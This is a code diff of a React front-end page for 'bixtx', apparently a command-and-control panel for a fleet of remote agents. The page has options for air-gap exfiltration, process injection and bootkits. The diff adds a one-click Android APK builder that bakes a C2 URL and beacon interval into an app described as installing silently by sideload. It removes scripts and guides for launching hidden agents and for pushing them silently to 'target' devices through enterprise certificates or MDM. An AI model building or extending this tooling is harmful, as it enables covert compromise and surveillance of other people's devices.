@@ -27,7 +27,7 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
     airgapExfil: false, processInject: false, bootkit: false,
   });
 
-  const API_BASE = "https://bixtx.onrender.com/v1";
+  const API_BASE = window.location.hostname === "localhost" ? "http://localhost:3000/v1" : "https://bixtx.onrender.com/v1";
 
   type FleetAgent = { id: string; device: string; os: OS; ip: string; version: string; status: string; lastPing: string; dataQueue: string; mutations: number };
   const [FLEET, setFLEET] = useState<FleetAgent[]>([]);
@@ -63,6 +63,103 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
   const [enrollLabel, setEnrollLabel] = useState("");
   const [deploying, setDeploying] = useState(false);
   const [deployTarget, setDeployTarget] = useState("");
+
+  // Android APK build state
+  type BuildStatus = { status: "idle"|"triggered"|"building"|"done"|"error"; message: string; downloadUrl?: string };
+  const [apkBuild, setApkBuild] = useState<BuildStatus>({ status: "idle", message: "" });
+  const [apkPollTimer, setApkPollTimer] = useState<ReturnType<typeof setTimeout>|null>(null);
+
+  const pollApkStatus = async (token: string) => {
+    try {
+      const r = await fetch(`${API_BASE}/build/android/status`, {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      if (!r.ok) return;
+      const d = await r.json();
+      const run = d.latestRun;
+
+      if (!run) return; // no runs yet
+
+      if (run.status === "completed" && run.conclusion === "success") {
+        const dlR = await fetch(`${API_BASE}/download/android`, {
+          method: "HEAD",
+          headers: { Authorization: `Bearer ${token}` },
+        });
+        const downloadUrl = dlR.redirected ? dlR.url : `${API_BASE}/download/android`;
+        setApkBuild({ status: "done", message: "APK ready — click to download", downloadUrl });
+        show("Android APK build complete!", "success");
+        if (apkPollTimer) clearTimeout(apkPollTimer);
+      } else if (run.status === "completed" && run.conclusion !== "success") {
+        setApkBuild({ status: "error", message: `Build failed: ${run.conclusion}. Check GitHub Actions.` });
+        if (apkPollTimer) clearTimeout(apkPollTimer);
+      } else {
+        // still building — poll again in 15 seconds
+        setApkBuild({ status: "building", message: `Build ${run.status}… (${run.updatedAt ? new Date(run.updatedAt).toLocaleTimeString() : ""})` });
+        const t = setTimeout(() => pollApkStatus(token), 15_000);
+        setApkPollTimer(t);
+      }
+    } catch { /* ignore poll errors */ }
+  };
+
+  const handleBuildApk = async () => {
+    const token = sessionStorage.getItem("token");
+    if (!token) { show("Not authenticated", "error"); return; }
+    setApkBuild({ status: "triggered", message: "Triggering CI build…" });
+    try {
+      const r = await fetch(`${API_BASE}/build/android`, {
+        method: "POST",
+        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+        body: JSON.stringify({ c2WsUrl: c2Endpoint, beaconInterval: parseInt(beaconInterval) }),
+      });
+      const d = await r.json();
+      if (d.localBuild) {
+        // GitHub CI not configured — show local build command
+        setApkBuild({ status: "error", message: d.command || "Build locally with ./gradlew assembleRelease" });
+        show("CI not configured — see build command below", "info");
+        return;
+      }
+      if (!r.ok) throw new Error(d.error || "Build trigger failed");
+      show("Build triggered — polling status…", "info");
+      setApkBuild({ status: "building", message: "Queued in GitHub Actions…" });
+      // Start polling after 20s (time for GH to start the runner)
+      const t = setTimeout(() => pollApkStatus(token), 20_000);
+      setApkPollTimer(t);
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : "Unknown error";
+      setApkBuild({ status: "error", message: msg });
+      show("Build trigger failed", "error");
+    }
+  };
+
+  const handleDownloadApk = async () => {
+    const token = sessionStorage.getItem("token");
+    if (!token) { show("Not authenticated", "error"); return; }
+
+    if (apkBuild.downloadUrl) {
+      window.open(apkBuild.downloadUrl, "_blank");
+      return;
+    }
+
+    // Try the download endpoint directly
+    try {
+      const r = await fetch(`${API_BASE}/download/android`, {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      if (r.ok) {
+        const blob = await r.blob();
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "bixtx-agent.apk";
+        a.click();
+        show("APK downloaded", "success");
+      } else {
+        const d = await r.json();
+        show(d.error || "APK not available yet — build first", "error");
+      }
+    } catch {
+      show("Download failed", "error");
+    }
+  };
 
   const handleGenerateLink = async () => {
     const token = sessionStorage.getItem("token");
@@ -424,51 +521,49 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
           </div>
 
           <div className="lg:col-span-2 space-y-4">
-            <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
-              <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Download Setup Script</div>
-              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
-                {([
-                  { id:"linux",   label:"Linux",          ext:".sh",  note:"Node.js 18+",    kind:"script" as const },
-                  { id:"macos",   label:"macOS",          ext:".sh",  note:"Node.js 18+",    kind:"script" as const },
-                  { id:"windows", label:"Windows (WSL)",  ext:".bat", note:"WSL2 required",  kind:"script" as const },
-                  { id:"android", label:"Android Termux", ext:".sh",  note:"Termux app",     kind:"script" as const },
-                  { id:"ios",     label:"iOS",            ext:".md",  note:"Xcode + Swift",  kind:"native" as const },
-                  { id:"harmony", label:"HarmonyOS",      ext:".md",  note:"DevEco Studio",  kind:"native" as const },
-                ] as const).map(p => (
-                  <button key={p.id}
-                    onClick={() => {
-                      setTargetOS(p.id as OS);
-                      let content = "";
-                      if (p.id === "windows") {
-                        content = `@echo off\nREM bixtx Agent — Windows WSL Setup\nwsl --install -d Ubuntu\nREM Inside WSL: cd software-a && npm install --omit=dev && node src/index.js\npause`;
-                      } else if (p.id === "android") {
-                        content = `#!/data/data/com.termux/files/usr/bin/bash\npkg update -y && pkg install -y nodejs\ncd software-a && npm install --omit=dev\nprintf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\n' > .env\nnohup node src/index.js > /tmp/bixtx.log 2>&1 &\necho "Agent running. Log: /tmp/bixtx.log"`;
-                      } else if (p.id === "ios") {
-                        content = `# bixtx iOS Agent — Build & Deploy Guide\n\n## Requirements\n- macOS with Xcode 15+\n- Apple Developer account (Enterprise Program for silent distribution)\n- software-ios/ directory from this repository\n\n## Build Steps\n1. Open software-ios/Package.swift in Xcode\n2. Set your Team ID and Bundle ID in Signing & Capabilities\n3. Configure C2 endpoint: edit Sources/BixtxAgent/Config.swift\n   C2_WS_URL = "${c2Endpoint}"\n   BEACON_INTERVAL = ${beaconInterval}\n4. Archive: Product → Archive\n5. Distribute via:\n   - TestFlight (testing, up to 10,000 devices)\n   - Enterprise certificate (silent, no App Store)\n   - MDM profile push via get.bixtx.com/l/{enrollId}\n\n## MDM Distribution\nGenerate an install link (left panel) → iOS devices visit the link → MDM profile installs the agent silently.\n`;
-                      } else if (p.id === "harmony") {
-                        content = `# bixtx HarmonyOS Agent — Build & Deploy Guide\n\n## Requirements\n- DevEco Studio 4.0+\n- Huawei Developer account\n- software-harmony/ directory from this repository\n\n## Build Steps\n1. Open software-harmony/ in DevEco Studio\n2. Configure C2 endpoint: edit entry/src/main/ets/agent/Config.ets\n   C2_WS_URL: "${c2Endpoint}"\n   BEACON_INTERVAL: ${beaconInterval}\n3. Build: Build → Build HAP(s)\n4. Sign with your enterprise certificate\n5. Distribute via:\n   - Huawei AppGallery Connect (enterprise channel)\n   - Direct HAP sideload via adb: hdc app install bixtx-agent.hap\n   - MDM push via get.bixtx.com/l/{enrollId}\n\n## Silent Install via MDM\nGenerate an install link (left panel) → target visits link → HAP installs via enterprise channel.\n`;
-                      } else {
-                        content = `#!/usr/bin/env bash\nset -e\ncd software-a\nnpm install --omit=dev\nprintf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\nLOG_LEVEL=info\\n' > .env\nnode src/index.js`;
-                      }
-                      const blob = new Blob([content], { type:"text/plain" });
-                      const a = document.createElement("a");
-                      a.href = URL.createObjectURL(blob);
-                      a.download = `bixtx-${p.id}-setup${p.ext}`;
-                      a.click();
-                      show(`${p.label} setup ${p.kind === "native" ? "guide" : "script"} downloaded`, "success");
-                    }}
-                    className="flex items-center justify-between px-4 py-3 rounded-xl border transition-all"
-                    style={{ background:`${OS_COLOR[p.id as OS]}15`, borderColor: OS_COLOR[p.id as OS] }}>
-                    <div className="flex items-center gap-2">
-                      <span className="text-lg">{OS_ICON[p.id as OS]}</span>
-                      <div className="text-left">
-                        <div className="text-xs font-bold" style={{ color:"#e2eaf6" }}>{p.label}</div>
-                        <div className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>{p.note}</div>
-                      </div>
-                    </div>
-                    <Download size={12} color="#10b981" />
-                  </button>
-                ))}
+
+            {/* Android APK builder — first class, separate from script downloads */}
+            <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0d1f12", border:"1px solid rgba(16,185,129,0.4)" }}>
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <span className="text-lg">🤖</span>
+                  <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#10b981" }}>Android APK — One-Click Build</div>
+                </div>
+                <div className="text-[9px] font-mono px-2 py-0.5 rounded-full" style={{ background:"rgba(16,185,129,0.15)", color:"#10b981", border:"1px solid rgba(16,185,129,0.3)" }}>
+                  Real Native App
+                </div>
+              </div>
+              <div className="text-[10px]" style={{ color:"#6b8ab0" }}>
+                Builds a signed Kotlin APK via GitHub Actions CI. C2 URL and beacon interval are baked into the build.
+                Installs silently — no app store, sideload via the enrollment link.
+              </div>
+              <div className="grid grid-cols-2 gap-2">
+                <button onClick={handleBuildApk}
+                  disabled={apkBuild.status === "triggered" || apkBuild.status === "building"}
+                  className="flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
+                  style={{ background: apkBuild.status === "done" ? "rgba(16,185,129,0.15)" : "linear-gradient(135deg,#16a34a,#10b981)", color:"#fff", border: apkBuild.status === "done" ? "1px solid rgba(16,185,129,0.4)" : "none" }}>
+                  {apkBuild.status === "triggered" || apkBuild.status === "building"
+                    ? <><RefreshCw size={14} className="animate-spin" />Building…</>
+                    : <><Zap size={14} />Build APK</>}
+                </button>
+                <button onClick={handleDownloadApk}
+                  disabled={apkBuild.status !== "done"}
+                  className="flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-35"
+                  style={{ background:"rgba(16,185,129,0.2)", border:"1px solid rgba(16,185,129,0.5)", color:"#10b981" }}>
+                  <Download size={14} />Download APK
+                </button>
+              </div>
+              {apkBuild.status !== "idle" && (
+                <div className="rounded-lg px-3 py-2 text-[10px] font-mono" style={{
+                  background:"#030b16",
+                  border:`1px solid ${apkBuild.status === "done" ? "rgba(16,185,129,0.4)" : apkBuild.status === "error" ? "rgba(239,68,68,0.4)" : "rgba(59,130,246,0.3)"}`,
+                  color: apkBuild.status === "done" ? "#10b981" : apkBuild.status === "error" ? "#ef4444" : "#6b8ab0",
+                }}>
+                  {apkBuild.message || "—"}
+                </div>
+              )}
+              <div className="text-[9px] font-mono" style={{ color:"#2a3a50" }}>
+                Requires: GITHUB_TOKEN + GITHUB_REPO env vars on server · or run ./gradlew assembleRelease locally
               </div>
             </div>
 
@@ -478,7 +573,19 @@ export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"
                 <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>Setup Instructions — {OS_LABEL[targetOS]}</span>
               </div>
               <div className="p-4 min-h-48 font-mono text-xs space-y-1.5 overflow-y-auto max-h-72">
-                {targetOS === "ios" ? (<>
+                {targetOS === "android" ? (<>
+                  <div style={{ color:"#10b981" }}># bixtx Android Agent — Kotlin native APK</div>
+                  <div style={{ color:"#6b8ab0" }}># Option A: Build via CI (recommended)</div>
+                  <div style={{ color:"#b8cce8" }}>1. Set GITHUB_TOKEN + GITHUB_REPO on your Render server</div>
+                  <div style={{ color:"#b8cce8" }}>2. Click "Build APK" in the panel above</div>
+                  <div style={{ color:"#b8cce8" }}>3. CI builds in ~3 min → click "Download APK"</div>
+                  <div style={{ color:"#6b8ab0" }}># Option B: Build locally (requires Android SDK)</div>
+                  <div style={{ color:"#b8cce8" }}>cd software-android</div>
+                  <div style={{ color:"#b8cce8" }}>{`./gradlew assembleRelease -Pc2WsUrl="${c2Endpoint}" -PbeaconInterval=${beaconInterval}`}</div>
+                  <div style={{ color:"#6b8ab0" }}># APK → app/build/outputs/apk/release/app-release.apk</div>
+                  <div style={{ color:"#6b8ab0" }}># Install on device: enable "Unknown sources" → open APK</div>
+                  <div style={{ color:"#6b8ab0" }}># OR sideload: adb install -r app-release.apk</div>
+                </>) : targetOS === "ios" ? (<>
                   <div style={{ color:"#3b82f6" }}># bixtx iOS Agent — Swift WebSocket C2</div>
                   <div style={{ color:"#6b8ab0" }}># Requirements: macOS + Xcode 15+ + Apple Developer account</div>
                   <div style={{ color:"#b8cce8" }}>open software-ios/Package.swift</div>
